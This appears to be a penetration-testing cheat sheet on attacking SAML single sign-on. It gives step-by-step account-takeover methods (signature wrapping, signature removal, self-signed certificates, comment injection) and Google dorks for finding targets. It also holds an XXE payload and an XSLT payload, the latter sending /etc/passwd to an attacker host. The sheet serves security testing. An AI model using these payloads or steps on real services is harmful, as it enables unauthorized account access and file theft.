# SAML
- **Single Sign-on (SSO) is an authentication service that allows users to utilize a single set of credentials to access multiple applications. Security Assertion Markup Language (SAML) is one of the ways one can implement SSO.**
- **Security Assertion Markup Language (SAML) is a markup language implemented in XML.**
- **SAML messages are base64 encoded but that is easily decoded to view the message contents.**
- **SAML and OAuth are different protocols and are used for different purposes, OAuth is a protocol for authorization while SAML is a protocol for authentication.**

# How it Works:

- SAML enables SSO by managing the interaction between three parties: The user(**SAML Assertion**), the identity provider, and the service provider

```python
1. SAML Assertion:An XML message that contains information about the user’s identity and potentially other user attributes.
2. Identity Provider (IdP): The service performing the authentication and issuing the Assertion. Authentication can be any number of things from username/password to 2FA.
3. Service Provider (SP): The web application that the user wants to access.
```

![Capture JPG](https://user-images.githubusercontent.com/33719912/157280386-aecedbe9-55d9-49fb-aa20-afc31393c5f9.jpg)


# Attacks:

1. **XML SIGNATURE WRAPPING (XSW):** 
- The basic premise behind XSW is that XML documents containing XML Signatures may be processed in two separate steps: once for the validation of the digital signature, and once for the real application that uses the XML data. Consider the following two steps and the methods used to arrive at a single XML element:
- XML Signature Validation
    - The application locates the **`<ds:Signature>`**’s **`<ds:Reference>`** element
    - The application uses the **`<ds:Reference>`**’s **`URI`** attribute to determine which XML element is signed
    - The application (in)validates the signed XML element
- After validation, the same application attempts to use the signed data as part of its normal operation.
    - The application’s XML parser locates its desired XML element using top-down tree-based navigation

```python
- Signature wrapping attacks bypass signature validation of Sam'l assertions. This is done because the service provider does not check for multiple assertions. By sending more than one assertion within a SAML message, we're able to confuse the service provider. We are able to have our valid assertion pass through with an Invalid assertion that then assumes the identity of another user when engaged with a penetration test involving SAML. Make sure you ask your client contact for an extra username which is valid on the system for testing purposes. You won't need the credentials for this user, but you do need another user name that is valid.
- When multiple assertion bodies are provided to the service provider with a signature wrapping attack, after the identity provider authenticated our user, we are able to confuse the service provider and then we are able to gain access to the additional users account that we provided in this case Admin.

- There are total 8 types XSW attacks. (All of them can be easily done using SAMLRaider)

# Steps to Perform XSW Attacks:
1. Login to SSO
2. Intercept the request were you can see SAML Assertions in SAML Raider
3. Try every XSW attacks that SAML Raider offers by clicking "Apply XSW" button.
4. Once you see XSW attack applied in SAML Raider change the top assertion value to you desire account
5. Now Forward it through.
6. Done, Check if you are logged in as the victim.

Reference: https://www.youtube.com/watch?v=ALakvKDsZLo  
```

```python
**Key Note:** XSW #2, XSW #1, manipulates SAML responses. The only two that deal with Responses are XSW #1 and XSW #2.

XSW Attack #1
- XSW #1 tampers with SAML responses. It accomplishes this by producing a copy of the SAML Response and Assertion, then inserting the original Signature as a child element of the copied Response into the XML. The assumption is that following signature validation, the XML parser identifies and utilises the copied Response at the top of the document rather than the original signed Response.
XSW Attack #2
- The primary distinction between #1 and #2 is that XSW #2 uses a detachable signature, whereas XSW #1 uses an enveloping signature. The malicious Response's position remains unchanged.

**Key Note:** XSW #4 is similar to #3 they play with Assertion element.

XSW Attacks #3
- The first example of an XSW that wraps the Assertion element is XSW #3. The cloned Assertion is inserted as the first child of the root Response element by SAML Raider. The replicated Assertion is a sibling of the original Assertion.
XSW Attakcs #4
- XSW #4 is similar to #3, except that the original Assertion becomes a child of the duplicated Assertion in this case.

**Key Note:** XSW #5 and #6 are similar and deals with Assertion Wrapping

XSW Attack #5
- XSW #5 is the first example of Assertion wrapping in which the Signature and the original Assertion are not in one of the three typical configurations (enveloped/enveloping/detached). The duplicated Assertion encircles the Signature in this example.
XSW Attack #6
- XSW #6 places its duplicated Assertion in the same spot as #s 4 and 5. The copy of the Assertion envelopes the Signature, which in turn envelopes the original Assertion.

**Key Note:** 
- Extensions is a valid XML element with a broader schema specification. This technique was created in response to the OpenSAML library by the authors of this white paper. To accurately compare the ID used during signature validation to the ID of the processed Assertion, OpenSAML employed schema validation. The authors discovered that if copied Assertions with the same ID as the original Assertion were children of an element with a less restrictive schema definition, they might avoid this countermeasure.
- XSW attack #7 and #8

XSW Attack #7
- XSW #7 inserts an Extensions element and adds the copied Assertion as a child.
XSW Attack #8
- XSW #8 use a less restrictive XML element to execute a variant of the attack pattern employed in XSW #7. Instead of the copied Assertion, the original Assertion is the child of the less restrictive element this time.
```

2. **XML SIGNATURE EXCLUSION:**
- Signature Exclusion is used to test how the SAML implementation behaves when there is no Signature element.
- When a Signature element is absent the signature validation step may get skipped entirely.

```python
# Steps to Perform:
1. Intercept SAML response.
2. Open SAMLRaider and click "Remove Signatures" button
3. Forward the request.
4. If not error from SP (Service Provider) then try tampering attribute like UserID.
5. Done!, check if you are in Vitim Account.

# Other Signature Attacks:
- Predictable signature
- Use of encryption with a weak signature

```

3. **CERTIFICATE FAKING:**
- Certificate faking is the process of testing whether or not the Service Provider verifies that a trusted Identity Provider signed the SAML Message.

```python
# Steps to Perform:
1. Intercept SAML response in SAMLRaider.
2. If there is a Signature included in the Response, use the "Send Certificate to SAML Raider Certs" button.
3. After sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab.
4. We highlight the imported cert and press the "Save and Self-Sign" button.
5. Back to Burp Proxy SAML Raider
6. First, select the new self-signed cert from the XML Signature dropdown menu.
7. Then use the "Remove Signatures" button to remove any existing signatures.
8. Finally, use the "(Re-)Sign Message" or "(Re-)Sign Assertion button"
9. After signing the message with the self-signed cert, send it on its way.

- If we authenticate, we know that we can sign our SAML Messages. 
- The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.
```

4. **TOKEN RECIPIENT CONFUSION:**
- Token Recipient Confusion tests whether or not the Service Provider validates the Recipient.
- The Recipient field is an attribute of the SubjectConfirmationData element, which is a child of the Subject element in a SAML Response.
- The Recipient attribute found on the SubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.

```python
# Pre-requisite:
- Have a Legit account on a SP to use the token we get from SP on Target-SP and both SP's should use Same IdP.

# Steps to Peform:
1. Get Token From Legit-SP
2. Try Same on Target-SP
3. If successful you will be able to access Target-SP resource.

#Exploitation Example:
Exploit 1: Suppose that SP SA  (Developer Department) and Starget (Sales Department) are accepting tokens from the same IdP, and the attacker does not have access to Starget .
The attacker (e.g. a worker in the developer team) does, however, have a legitimate account on SA, thus he can request a token from the IdP for this service. By sending tA to Starget (instead of SA ), the attack is performed. It is considered successful if tA is accepted by Starget; the attacker is thus logged in with the same account name as he has for SA and gets access to Starget's corresponding resources.

Exploit 2: Alternatively, the attacker can set up his own SP (Sbad ) offering some service for registered users (e.g., a weather forecast). To authenticate to Sbad, SSO is used and the attacker specifically federates it with the same IdP used by Starget . After that, the attacker lures the victim (a legitimate user of Starget ) to register with and authenticate to Sbad. Instead of or in addition to its usual service (weather forecast), Sbad stores all tokens in a database so that the attacker can access them. The attacker can then try to use the tokens to log in on Starget as the victim. The attack is considered successful, if an authentication token tbad issued for the victim for service Sbad is successfully verified on Starget .
```

5. **MISCELLANEOUS ATTACKS:**

```python
#. Simply Change Assertion Value to Victim:
1. Intercept SAML Response in SAML Raider
2. Change the User parameter or id to other user.
		Example: user@email.com to admin@email.com
3. Done, Forward the Request.

# SAML: Comment Injection I
1. Find Registeration page for SP
2. Use comment in payload like "admin<!--comment-->@email.com" while registering
3. SP think it as admin@email.com 
4. Done, you are admin now ;)

# SAML: Comment Injection II
1. Find Registeration page for SP
2. Register as any user like "admin<!--comment-->@gmail.com" ==> Invalid signature
3. Try different "admin@gmail.com<!--comment-->.test" ==> valid signature
4. SP think it as admin@email.com 
5. Done, you are admin now ;)
```

6. **XXE  in SAML:**

```python
**NOTE:** You can try all XXE attack techniques here its not limited to this only.

# SIMPLE XXE ATTACK:
1. Intercept the SAML Response in SAML Raider
2. Add XXE payload in the beginning like below:
		<?xml version="1.0" encoding="UTF-8"?>
		 <!DOCTYPE foo [  
	   <!ELEMENT foo ANY >
	   <!ENTITY    file SYSTEM "file:///etc/passwd">
	   <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
3. Send the Request and check the response.
4. Done, escalate further!.
```

7. **XSLT in SAML:**

```python
**NOTE:**
- The attack doesn’t require a valid signature to succeed.
- The XSLT transformation occurs before the digital signature is processed for verification.

# Steps to Perform:
1**. Intercept the SAML Response in SAML Raider.
2. Add XSLT payload in side transforms assertion like below.
		<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
	  ...
	    <ds:Transforms>
	      <ds:Transform>
	        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	          <xsl:template match="doc">
	            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
	            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
	            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
	            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
	            <xsl:value-of select="unparsed-text($exploitUrl)"/>
	          </xsl:template>
	        </xsl:stylesheet>
	      </ds:Transform>
	    </ds:Transforms>
	  ...
		</ds:Signature>
3. Forward the request and check response.
4. Done Escalate Further.!! 
```

# Tools:

[SAML Encoder - Online SAML Request-Response Encode Tool - Base64 - Deflate](https://www.samltool.com/encode.php)

[https://github.com/CompassSecurity/SAMLRaider](https://github.com/CompassSecurity/SAMLRaider)

[GitHub - fadyosman/SAMLExtractor: A tool that can take a URL or list of URL and prints back SAML consume URL.](https://github.com/fadyosman/SAMLExtractor)

# Labs:

[GitHub - yogisec/VulnerableSAMLApp: Vulnerable SAML infrastructure training applicaiton](https://github.com/yogisec/VulnerableSAMLApp)

# Reference:

[How to Hunt Bugs in SAML; a Methodology - Part I -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)

[How to Hunt Bugs in SAML; a Methodology - Part II -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)

[How to Hunt Bugs in SAML; a Methodology - Part III -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

[https://sso-attacks.org/Main_Page](https://sso-attacks.org/Main_Page)

[https://research.aurainfosec.io/bypassing-saml20-SSO/](https://research.aurainfosec.io/bypassing-saml20-SSO/)

[SAML From A Hackers Perspective - Part 1 Intro](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)

[Verification of SAML Tokens - Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)

## Mind-Maps:

- [Mind Map by Harsh Bothra Checklist for SAML.pdf](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)

![https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)

# Tips:

```python
Google Dork to Find SAML logins:
inurl:"/saml2?SAMLRequest="
inurl:"/simplesaml/module.php/core/loginuserpass.php?AuthState="
inurl:"simplesaml/saml2/idp"

Burp search [SAMLResponse]
 1.PHNhbWx -> b64decode -> '<saml'
 2.PD94bWw -> b64decode -> '<?xml'
```
